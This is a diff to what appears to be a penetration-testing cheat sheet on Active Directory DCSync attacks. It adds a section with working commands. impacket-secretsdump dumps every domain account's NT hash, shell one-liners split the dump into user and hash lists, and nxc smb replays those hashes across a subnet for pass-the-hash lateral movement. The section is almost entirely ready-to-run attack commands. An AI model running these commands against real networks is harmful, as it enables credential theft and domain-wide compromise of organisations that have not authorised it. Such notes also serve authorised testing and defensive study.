@@ -57,3 +57,13 @@ impacket-secretsdump -dc-ip <DC-IP> -just-dc-ntlm '<DOMAIN.TLD>/<USER>:<PW>@<DC-
 - `-just-dc-user` limits output but doesn't bypass missing rights. `-just-dc` = all secrets, `-just-dc-ntlm` = NT hashes only.
 - Use recovered NT / AES keys in [lateral-movement](lateral-movement.md) or [tickets](tickets.md).
 - If an object-rights path gave you the replication ACL temporarily, restore the original ACL.
+
+## DCSync dump → user / NT lists for reuse
+```bash
+impacket-secretsdump -dc-ip <DC-IP> -just-dc-ntlm -outputfile dcsync '<DOMAIN.TLD>/<USER>:<PW>@<DC-FQDN>'
+grep -v '\$:' dcsync.ntds | cut -d: -f1 | sed 's/.*\\//' > dc_users.txt
+grep -v '\$:' dcsync.ntds | cut -d: -f4 > dc_nt.txt
+nxc smb <SUBNET> -u dc_users.txt -H dc_nt.txt --no-bruteforce --continue-on-success
+```
+- `-outputfile X` writes `X.ntds` as `DOMAIN\user:RID:LM:NT:::`; `grep -v '\$:'` drops machine accounts.
+- `--no-bruteforce` pairs line N with line N: don't sort or dedupe either file.
